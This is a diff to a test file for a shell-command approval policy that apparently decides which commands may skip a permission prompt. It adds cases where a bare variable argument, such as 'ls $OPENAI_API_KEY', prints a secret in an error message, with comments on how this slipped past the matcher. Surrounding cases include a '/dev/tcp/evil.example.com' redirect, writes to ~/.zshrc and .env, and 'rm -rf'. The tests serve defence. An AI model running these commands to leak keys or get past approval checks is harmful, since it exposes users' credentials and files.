@@ -203,6 +203,9 @@ describe("shortCircuit", () => {
       ["an append redirect", "git status >> ~/.zshrc"],
       ["an input redirect", "npm test < /dev/tcp/evil.example.com/80"],
       ["a redirect with no space before it", "ls>.env"],
+      // The shell expands it before the verb sees it, and the verb's error message prints it.
+      ["a variable as an argument", "ls $OPENAI_API_KEY"],
+      ["a braced variable as an argument", "ls ${STRIPE_SECRET_KEY}"],
       ["an unrelated command", "rm -rf build"],
       // An entry with no trailing space is a whole command. ADR-010: the argument is what
       // makes `npm test` stop being the project's own script.
@@ -292,6 +295,12 @@ describe("the shipped default policy, end to end", () => {
     ["moving a branch back twenty commits", "git branch -f main HEAD~20"],
     ["renaming the current branch", "git branch -m main old"],
     ["removing a remote behind a read-only flag", "git remote -v remove origin"],
+    // `echo $OPENAI_API_KEY` by another verb. Tried with a fake variable: `ls $VAR` prints
+    // "ls: <value>: No such file or directory" in bash and zsh, and zsh's `which $VAR` prints
+    // "<value> not found". The matcher refused `$(` and let a bare `$` through.
+    ["listing a path named by a secret", "ls $OPENAI_API_KEY"],
+    ["resolving a command named by a secret", "which $AWS_SECRET_ACCESS_KEY"],
+    ["a status scoped to a path named by a secret", "git status ${GITHUB_TOKEN}"],
     // A listed verb that runs the project's own code, given the argument that makes it run
     // something else. The first four were each run for real in a scratch project and did
     // what the label says; pytest was not installed to try, and `-p` is its documented way
